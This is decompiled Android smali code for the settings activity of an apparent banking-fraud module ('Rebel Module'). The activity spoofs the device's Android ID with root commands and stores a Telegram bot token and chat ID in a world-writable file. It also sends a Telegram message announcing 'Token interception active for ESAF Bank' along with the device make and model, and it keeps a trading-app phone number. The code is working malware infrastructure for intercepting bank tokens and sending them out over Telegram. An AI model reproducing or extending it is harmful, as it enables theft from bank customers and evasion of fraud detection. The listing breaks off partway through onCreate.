.class public Lcom/rebel/module/ZetSettingsActivity;
.super Landroid/app/Activity;
.source "ZetSettingsActivity.java"


# static fields
.field private static final ANDROID_ID_FILE:Ljava/lang/String; = "/data/local/tmp/zet_android_id"

.field private static final KEY_ANDROID_ID:Ljava/lang/String; = "spoofed_android_id"

.field private static final MAIN_CONFIG:Ljava/lang/String; = "/data/local/tmp/src_module_config.json"

.field private static final PREFS:Ljava/lang/String; = "zet_prefs"


# instance fields
.field private btnValidate:Landroid/widget/Button;

.field private etAndroidId:Landroid/widget/EditText;

.field private etBotToken:Landroid/widget/EditText;

.field private etChatId:Landroid/widget/EditText;

.field private etGrowwNumber:Landroid/widget/EditText;

.field private tvTelegramStatus:Landroid/widget/TextView;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 27
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private generateRandomHex(I)Ljava/lang/String;
    .locals 5
    .param p1, "len"    # I

    .line 267
    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    .line 268
    .local v0, "rng":Ljava/util/Random;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1, p1}, Ljava/lang/StringBuilder;-><init>(I)V

    .line 269
    .local v1, "sb":Ljava/lang/StringBuilder;
    const-string v2, "0123456789abcdef"

    .line 270
    .local v2, "chars":Ljava/lang/String;
    const/4 v3, 0x0

    .local v3, "i":I
    :goto_0
    if-ge v3, p1, :cond_0

    .line 271
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v4

    invoke-virtual {v0, v4}, Ljava/util/Random;->nextInt(I)I

    move-result v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->charAt(I)C

    move-result v4

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 270
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 273
    .end local v3    # "i":I
    :cond_0
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    return-object v3
.end method

.method static synthetic lambda$writeIdFile$0(Ljava/lang/String;)V
    .locals 9
    .param p0, "id"    # Ljava/lang/String;

    .line 111
    const-string v0, "/data/local/tmp/zet_android_id"

    const/4 v1, 0x2

    const/4 v2, 0x1

    const/4 v3, 0x3

    const/4 v4, 0x0

    :try_start_0
    new-instance v5, Ljava/io/FileWriter;

    invoke-direct {v5, v0, v4}, Ljava/io/FileWriter;-><init>(Ljava/lang/String;Z)V

    .line 112
    .local v5, "fw":Ljava/io/FileWriter;
    invoke-virtual {v5, p0}, Ljava/io/FileWriter;->write(Ljava/lang/String;)V

    .line 113
    invoke-virtual {v5}, Ljava/io/FileWriter;->flush()V

    .line 114
    invoke-virtual {v5}, Ljava/io/FileWriter;->close()V

    .line 115
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v6

    new-array v7, v3, [Ljava/lang/String;

    const-string v8, "chmod"

    aput-object v8, v7, v4

    const-string v8, "644"

    aput-object v8, v7, v2

    aput-object v0, v7, v1

    invoke-virtual {v6, v7}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 123
    nop

    .end local v5    # "fw":Ljava/io/FileWriter;
    goto :goto_1

    .line 116
    :catch_0
    move-exception v5

    .line 118
    .local v5, "ignored":Ljava/lang/Exception;
    :try_start_1
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v6

    new-array v3, v3, [Ljava/lang/String;

    const-string v7, "su"

    aput-object v7, v3, v4

    const-string v4, "-c"

    aput-object v4, v3, v2

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "echo "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v4, " > "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v4, " && chmod 644 "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    aput-object v0, v3, v1

    invoke-virtual {v6, v3}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 121
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    .line 122
    :catch_1
    move-exception v0

    :goto_0
    nop

    .line 124
    .end local v5    # "ignored":Ljava/lang/Exception;
    :goto_1
    return-void
.end method

.method private loadGrowwNumber()V
    .locals 3

    .line 77
    :try_start_0
    new-instance v0, Lcom/rebel/module/ConfigManager;

    invoke-direct {v0}, Lcom/rebel/module/ConfigManager;-><init>()V

    .line 78
    .local v0, "cm":Lcom/rebel/module/ConfigManager;
    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->getGrowwMobileNo()Ljava/lang/String;

    move-result-object v1

    .line 79
    .local v1, "number":Ljava/lang/String;
    if-eqz v1, :cond_0

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_0

    .line 80
    iget-object v2, p0, Lcom/rebel/module/ZetSettingsActivity;->etGrowwNumber:Landroid/widget/EditText;

    invoke-virtual {v2, v1}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 82
    .end local v0    # "cm":Lcom/rebel/module/ConfigManager;
    .end local v1    # "number":Ljava/lang/String;
    :catch_0
    move-exception v0

    :cond_0
    :goto_0
    nop

    .line 83
    return-void
.end method

.method private loadTelegramConfig()V
    .locals 8

    .line 157
    const-string v0, ""

    :try_start_0
    new-instance v1, Ljava/io/File;

    const-string v2, "/data/local/tmp/src_module_config.json"

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 158
    .local v1, "f":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_2

    invoke-virtual {v1}, Ljava/io/File;->canRead()Z

    move-result v2

    if-eqz v2, :cond_2

    .line 159
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 160
    .local v2, "sb":Ljava/lang/StringBuilder;
    new-instance v3, Ljava/io/BufferedReader;

    new-instance v4, Ljava/io/FileReader;

    invoke-direct {v4, v1}, Ljava/io/FileReader;-><init>(Ljava/io/File;)V

    invoke-direct {v3, v4}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 162
    .local v3, "br":Ljava/io/BufferedReader;
    :goto_0
    invoke-virtual {v3}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    move-object v5, v4

    .local v5, "line":Ljava/lang/String;
    if-eqz v4, :cond_0

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_0

    .line 163
    :cond_0
    invoke-virtual {v3}, Ljava/io/BufferedReader;->close()V

    .line 165
    new-instance v4, Lorg/json/JSONObject;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 166
    .local v4, "json":Lorg/json/JSONObject;
    const-string v6, "bot_token"

    invoke-virtual {v4, v6, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 167
    .local v6, "botToken":Ljava/lang/String;
    const-string v7, "chat_id"

    invoke-virtual {v4, v7, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 169
    .local v0, "chatId":Ljava/lang/String;
    invoke-virtual {v6}, Ljava/lang/String;->isEmpty()Z

    move-result v7

    if-nez v7, :cond_1

    iget-object v7, p0, Lcom/rebel/module/ZetSettingsActivity;->etBotToken:Landroid/widget/EditText;

    invoke-virtual {v7, v6}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 170
    :cond_1
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v7

    if-nez v7, :cond_2

    iget-object v7, p0, Lcom/rebel/module/ZetSettingsActivity;->etChatId:Landroid/widget/EditText;

    invoke-virtual {v7, v0}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 172
    .end local v0    # "chatId":Ljava/lang/String;
    .end local v1    # "f":Ljava/io/File;
    .end local v2    # "sb":Ljava/lang/StringBuilder;
    .end local v3    # "br":Ljava/io/BufferedReader;
    .end local v4    # "json":Lorg/json/JSONObject;
    .end local v5    # "line":Ljava/lang/String;
    .end local v6    # "botToken":Ljava/lang/String;
    :catch_0
    move-exception v0

    :cond_2
    :goto_1
    nop

    .line 173
    return-void
.end method

.method private saveTelegramConfig()V
    .locals 11

    .line 177
    const-string v0, "/data/local/tmp/src_module_config.json"

    :try_start_0
    iget-object v1, p0, Lcom/rebel/module/ZetSettingsActivity;->etBotToken:Landroid/widget/EditText;

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    const-string v2, ""

    if-eqz v1, :cond_0

    :try_start_1
    iget-object v1, p0, Lcom/rebel/module/ZetSettingsActivity;->etBotToken:Landroid/widget/EditText;

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v1

    goto :goto_0

    :cond_0
    move-object v1, v2

    .line 178
    .local v1, "botToken":Ljava/lang/String;
    :goto_0
    iget-object v3, p0, Lcom/rebel/module/ZetSettingsActivity;->etChatId:Landroid/widget/EditText;

    invoke-virtual {v3}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v3

    if-eqz v3, :cond_1

    iget-object v2, p0, Lcom/rebel/module/ZetSettingsActivity;->etChatId:Landroid/widget/EditText;

    invoke-virtual {v2}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    .line 180
    .local v2, "chatId":Ljava/lang/String;
    :cond_1
    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-eqz v3, :cond_2

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-eqz v3, :cond_2

    return-void

    .line 183
    :cond_2
    new-instance v3, Ljava/io/File;

    invoke-direct {v3, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 184
    .local v3, "f":Ljava/io/File;
    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_4

    invoke-virtual {v3}, Ljava/io/File;->canRead()Z

    move-result v4

    if-eqz v4, :cond_4

    .line 185
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 186
    .local v4, "sb":Ljava/lang/StringBuilder;
    new-instance v5, Ljava/io/BufferedReader;

    new-instance v6, Ljava/io/FileReader;

    invoke-direct {v6, v3}, Ljava/io/FileReader;-><init>(Ljava/io/File;)V

    invoke-direct {v5, v6}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 188
    .local v5, "br":Ljava/io/BufferedReader;
    :goto_1
    invoke-virtual {v5}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v6

    move-object v7, v6

    .local v7, "line":Ljava/lang/String;
    if-eqz v6, :cond_3

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_1

    .line 189
    :cond_3
    invoke-virtual {v5}, Ljava/io/BufferedReader;->close()V

    .line 190
    new-instance v6, Lorg/json/JSONObject;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-direct {v6, v8}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 191
    .end local v4    # "sb":Ljava/lang/StringBuilder;
    .end local v5    # "br":Ljava/io/BufferedReader;
    .end local v7    # "line":Ljava/lang/String;
    .local v6, "json":Lorg/json/JSONObject;
    goto :goto_2

    .line 192
    .end local v6    # "json":Lorg/json/JSONObject;
    :cond_4
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    move-object v6, v4

    .line 195
    .restart local v6    # "json":Lorg/json/JSONObject;
    :goto_2
    const-string v4, "bot_token"

    invoke-virtual {v6, v4, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 196
    const-string v4, "chat_id"

    invoke-virtual {v6, v4, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 198
    invoke-virtual {v6}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 200
    .local v4, "jsonStr":Ljava/lang/String;
    :try_start_2
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v5

    const/4 v7, 0x3

    new-array v7, v7, [Ljava/lang/String;

    const-string v8, "su"

    const/4 v9, 0x0

    aput-object v8, v7, v9

    const-string v8, "-c"

    const/4 v9, 0x1

    aput-object v8, v7, v9

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "echo \'"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "\'"

    const-string v10, "\'\\\'\'"

    .line 201
    invoke-virtual {v4, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "\' > "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " && chmod 666 "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x2

    aput-object v8, v7, v9

    .line 200
    invoke-virtual {v5, v7}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v5

    .line 202
    .local v5, "p":Ljava/lang/Process;
    invoke-virtual {v5}, Ljava/lang/Process;->waitFor()I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 207
    .end local v5    # "p":Ljava/lang/Process;
    goto :goto_3

    .line 203
    :catch_0
    move-exception v5

    .line 204
    .local v5, "e":Ljava/lang/Exception;
    :try_start_3
    new-instance v7, Ljava/io/FileWriter;

    invoke-direct {v7, v0}, Ljava/io/FileWriter;-><init>(Ljava/lang/String;)V

    .line 205
    .local v7, "fw":Ljava/io/FileWriter;
    invoke-virtual {v7, v4}, Ljava/io/FileWriter;->write(Ljava/lang/String;)V

    .line 206
    invoke-virtual {v7}, Ljava/io/FileWriter;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_3

    .line 208
    .end local v1    # "botToken":Ljava/lang/String;
    .end local v2    # "chatId":Ljava/lang/String;
    .end local v3    # "f":Ljava/io/File;
    .end local v4    # "jsonStr":Ljava/lang/String;
    .end local v5    # "e":Ljava/lang/Exception;
    .end local v6    # "json":Lorg/json/JSONObject;
    .end local v7    # "fw":Ljava/io/FileWriter;
    :catch_1
    move-exception v0

    :goto_3
    nop

    .line 209
    return-void
.end method

.method private writeIdFile(Ljava/lang/String;)V
    .locals 2
    .param p1, "id"    # Ljava/lang/String;

    .line 109
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/rebel/module/ZetSettingsActivity$$ExternalSyntheticLambda0;

    invoke-direct {v1, p1}, Lcom/rebel/module/ZetSettingsActivity$$ExternalSyntheticLambda0;-><init>(Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 124
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 125
    return-void
.end method


# virtual methods
.method synthetic lambda$onValidateTelegramClick$1$com-src-module-ZetSettingsActivity(I)V
    .locals 4
    .param p1, "responseCode"    # I

    .line 242
    iget-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->btnValidate:Landroid/widget/Button;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setEnabled(Z)V

    .line 243
    iget-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->btnValidate:Landroid/widget/Button;

    const-string v1, "\u2705  Validate Telegram"

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    .line 244
    nop

    .line 249
    iget-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->tvTelegramStatus:Landroid/widget/TextView;

    .line 244
    const/4 v1, 0x0

    const/16 v2, 0xc8

    if-ne p1, v2, :cond_0

    .line 245
    const-string v2, "\u2705 Connected! Test message sent to Telegram."

    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 246
    iget-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->tvTelegramStatus:Landroid/widget/TextView;

    const v2, -0xb350b0

    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setTextColor(I)V

    .line 247
    const-string v0, "\u2705 Telegram verified!"

    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    goto :goto_0

    .line 249
    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\u274c HTTP "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " \u2014 check token/chat ID"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 250
    iget-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->tvTelegramStatus:Landroid/widget/TextView;

    const v2, -0x1ac6cb

    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setTextColor(I)V

    .line 251
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "\u274c Failed: HTTP "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 253
    :goto_0
    return-void
.end method

.method synthetic lambda$onValidateTelegramClick$2$com-src-module-ZetSettingsActivity(Ljava/lang/Exception;)V
    .locals 3
    .param p1, "e"    # Ljava/lang/Exception;

    .line 256
    iget-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->btnValidate:Landroid/widget/Button;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setEnabled(Z)V

    .line 257
    iget-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->btnValidate:Landroid/widget/Button;

    const-string v1, "\u2705  Validate Telegram"

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    .line 258
    iget-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->tvTelegramStatus:Landroid/widget/TextView;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "\u274c Error: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 259
    iget-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->tvTelegramStatus:Landroid/widget/TextView;

    const v1, -0x1ac6cb

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTextColor(I)V

    .line 260
    return-void
.end method

.method synthetic lambda$onValidateTelegramClick$3$com-src-module-ZetSettingsActivity(Ljava/lang/String;Ljava/lang/String;)V
    .locals 4
    .param p1, "botToken"    # Ljava/lang/String;
    .param p2, "chatId"    # Ljava/lang/String;

    .line 231
    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "\u2705 *Rebel Module \u2014 ESAF Connected*\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\ud83d\udcf1 *Device:* `"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "`\n\ud83d\udd50 *Time:* `"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    new-instance v1, Ljava/text/SimpleDateFormat;

    const-string v2, "dd/MM/yyyy HH:mm:ss"

    sget-object v3, Ljava/util/Locale;->US:Ljava/util/Locale;

    invoke-direct {v1, v2, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    new-instance v2, Ljava/util/Date;

    invoke-direct {v2}, Ljava/util/Date;-><init>()V

    .line 235
    invoke-virtual {v1, v2}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "`\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nToken interception active for ESAF Bank"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 239
    .local v0, "testMsg":Ljava/lang/String;
    const-string v1, "Markdown"

    invoke-static {p1, p2, v0, v1}, Lcom/rebel/module/NativeBridge;->nativeSendTelegram(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v1

    .line 241
    .local v1, "responseCode":I
    new-instance v2, Lcom/rebel/module/ZetSettingsActivity$$ExternalSyntheticLambda1;

    invoke-direct {v2, p0, v1}, Lcom/rebel/module/ZetSettingsActivity$$ExternalSyntheticLambda1;-><init>(Lcom/rebel/module/ZetSettingsActivity;I)V

    invoke-virtual {p0, v2}, Lcom/rebel/module/ZetSettingsActivity;->runOnUiThread(Ljava/lang/Runnable;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 261
    .end local v0    # "testMsg":Ljava/lang/String;
    .end local v1    # "responseCode":I
    goto :goto_0

    .line 254
    :catch_0
    move-exception v0

    .line 255
    .local v0, "e":Ljava/lang/Exception;
    new-instance v1, Lcom/rebel/module/ZetSettingsActivity$$ExternalSyntheticLambda2;

    invoke-direct {v1, p0, v0}, Lcom/rebel/module/ZetSettingsActivity$$ExternalSyntheticLambda2;-><init>(Lcom/rebel/module/ZetSettingsActivity;Ljava/lang/Exception;)V

    invoke-virtual {p0, v1}, Lcom/rebel/module/ZetSettingsActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 262
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public onCloseClick(Landroid/view/View;)V
    .locals 0
    .param p1, "v"    # Landroid/view/View;

    .line 87
    invoke-virtual {p0}, Lcom/rebel/module/ZetSettingsActivity;->finish()V

    .line 88
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 42
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 43
    sget v0, Lcom/rebel/module/R$layout;->activity_zet_settings:I

    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetSettingsActivity;->setContentView(I)V

    .line 45
    sget v0, Lcom/rebel/module/R$id;->et_android_id:I

    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetSettingsActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->etAndroidId:Landroid/widget/EditText;

    .line 46
    sget v0, Lcom/rebel/module/R$id;->et_groww_number:I

    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetSettingsActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->etGrowwNumber:Landroid/widget/EditText;

    .line 49
    sget v0, Lcom/rebel/module/R$id;->et_bot_token:I

    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetSettingsActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/rebel/module/ZetSettingsActivity;->etBotToken:Landroid/widget/EditText;

    .line 50
    sget v0, Lcom/rebel/module/R$id;->et_chat_id:I

    invoke-virtual {p0, v0}, Lcom/rebel/module/ZetSettingsActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

